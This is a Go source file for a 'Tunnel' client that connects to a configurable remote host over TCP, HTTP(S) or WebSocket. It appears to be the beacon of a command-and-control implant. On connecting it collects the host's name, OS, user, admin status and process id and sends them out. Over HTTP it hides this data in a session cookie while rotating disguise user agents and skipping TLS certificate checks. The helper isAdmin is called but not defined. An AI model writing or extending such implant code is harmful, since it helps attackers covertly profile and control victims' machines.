package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
)

type Tunnel struct {
	Method      string
	LocalPort   int
	RemoteHost  string
	RemotePort  int
	CertFile    string
	KeyFile     string
	UserAgent   string
	RemoteURL   *url.URL
	RetryCount  int
	IsConnected bool
	Connection  interface{}
	EnableDebug bool
}

func NewTunnel(method, remoteHost string, remotePort int, debug bool) (*Tunnel, error) {
	if remoteHost == "" || remotePort == 0 {
		return nil, errors.New("remote host and port are required")
	}

	scheme := "http"
	switch method {
	case "https":
		scheme = "https"
	case "websocket":
		scheme = "ws"
	case "websockets":
		scheme = "wss"
	}

	remoteURL := fmt.Sprintf("%s://%s:%d", scheme, remoteHost, remotePort)
	parsedURL, err := url.Parse(remoteURL)
	if err != nil {
		return nil, err
	}

	return &Tunnel{
		Method:      method,
		RemoteHost:  remoteHost,
		RemotePort:  remotePort,
		UserAgent:   generateUserAgent(),
		RemoteURL:   parsedURL,
		EnableDebug: debug,
	}, nil
}

func (t *Tunnel) Start() error {
	if err := t.pingRemoteHost(); err != nil {
		return err
	}

	switch t.Method {
	case "tcp":
		return t.connectTCP()
	case "http", "https":
		return t.connectHTTP()
	case "websocket", "websockets":
		return t.connectWebSocket()
	default:
		return fmt.Errorf("unsupported protocol: %s", t.Method)
	}
}

func (t *Tunnel) pingRemoteHost() error {
	timeout := 5 * time.Second
	address := net.JoinHostPort(t.RemoteHost, fmt.Sprintf("%d", t.RemotePort))

	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return fmt.Errorf("connection check failed: %w", err)
	}
	conn.Close()
	return nil
}

func (t *Tunnel) connectTCP() error {
	timeout := time.Duration(5+t.RetryCount*2) * time.Second
	conn, err := net.DialTimeout("tcp", t.RemoteURL.Host, timeout)
	if err != nil {
		t.RetryCount++
		return err
	}

	t.Connection = conn
	t.IsConnected = true
	t.registerAgent(conn)
	return nil
}

func (t *Tunnel) connectHTTP() error {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
			},
		},
		Timeout: 15 * time.Second,
	}

	req, _ := http.NewRequest("GET", t.RemoteURL.String(), nil)
	req.Header = http.Header{
		"User-Agent": []string{t.UserAgent},
		"Accept":     []string{"*/*"},
	}

	metadata := t.buildRegistrationData()
	req.AddCookie(&http.Cookie{
		Name:  "session",
		Value: string(metadata),
	})

	resp, err := client.Do(req)
	if err != nil {
		t.RetryCount++
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("unexpected response: %d", resp.StatusCode)
	}

	t.Connection = client
	t.IsConnected = true
	return nil
}

func (t *Tunnel) connectWebSocket() error {
	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		HandshakeTimeout: 10 * time.Second,
	}

	header := http.Header{}
	header.Add("User-Agent", t.UserAgent)
	header.Add("Origin", "https://"+t.RemoteURL.Hostname())

	conn, _, err := dialer.Dial(t.RemoteURL.String(), header)
	if err != nil {
		t.RetryCount++
		return err
	}

	regData := t.buildRegistrationData()
	if err := conn.WriteMessage(websocket.BinaryMessage, regData); err != nil {
		conn.Close()
		return err
	}

	t.Connection = conn
	t.IsConnected = true
	return nil
}

func (t *Tunnel) buildRegistrationData() []byte {
	hostname, _ := os.Hostname()
	username := "unknown"
	if user, err := user.Current(); err == nil {
		username = user.Username
	}

	data := map[string]interface{}{
		"hostname":     hostname,
		"os":           runtime.GOOS,
		"arch":         runtime.GOARCH,
		"user":         username,
		"privileges":   isAdmin(),
		"pid":          os.Getpid(),
		"first_seen":   time.Now().UTC().Unix(),
		"client_nonce": generateNonce(16),
	}

	jsonData, _ := json.Marshal(data)
	return jsonData
}

func generateNonce(size int) []byte {
	nonce := make([]byte, size)
	rand.Read(nonce)
	return nonce
}

func generateUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Go-http-client/1.1",
		"curl/7.64.1",
	}
	return agents[time.Now().Unix()%int64(len(agents))]
}

func (t *Tunnel) registerAgent(conn net.Conn) {
	data := t.buildRegistrationData()
	conn.Write(data)
}
